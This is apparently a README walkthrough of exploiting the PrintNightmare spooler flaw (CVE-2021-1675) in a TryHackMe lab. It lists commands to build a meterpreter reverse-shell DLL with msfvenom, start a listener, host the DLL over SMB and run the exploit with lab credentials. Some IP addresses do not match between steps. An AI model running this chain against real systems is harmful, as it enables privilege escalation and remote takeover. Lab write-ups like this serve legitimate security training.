# printnightmare-try-hack-me
A Walkthrough of the PrintNightmare vulnerability utilizing the tryhackme environment 

This is a post compromise attack that takes advantage of the printer spooler. This basic spooler function runs as system privilege. Because it runs as system privilege, this means that any authenticated attacker can run code execution. Although Microsoft has released a patched to mitigate this attack, many bugs don’t always get patched, and this bug will continue to show up for some time.<br> 



### CVE-2021-1675 Walkthrough
<br>

- attacker machine: 10.10.217.212
- target machine: 10.10.103.215
  
<br> 
<br>
1. Before running the exploit, create a PrintNightmare director (pn) and a share directory. 

```
git clone https://github.com/tryhackme/CVE-2021-1675
```

<br>
<br> 
2. Be sure to check if environment is vulnerable

```
rpcdump.py @10.10.103.216 | egrep 'MS-RPRN|MS-PAR'
```

<br>
<br>
3. msfvenom to generate payload and create malicious .dll

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f dll -o ~/Desktop/share/malicious.dll 
```

<br>
<br>
4. With msfvenom you need to set up meterpreter session on msfconsole using the same payload you used with msfvenom

```
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.10.217.212
set lport 4444
run -j
```

<br>
<br>
5. To host the payload, we use smbserver (a tool from impacket). This is the local folder that will share the malicious .dll

```
smbserver.py share /root/Desktop/share/ -smb2support
```
*Make sure to run file share with smb2support to ensure compatibility and effectiveness

<br>
<br>
6. Now, everything is set up, you are ready to run the malicious script. Remember that this is a post-compromise attack, so we have domain controller and domain name, and we have username and password. And then we also have the path to the share file.

```
python3.9 CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.103.215 '\\10.10.217.212\share\malicious.dll'
```




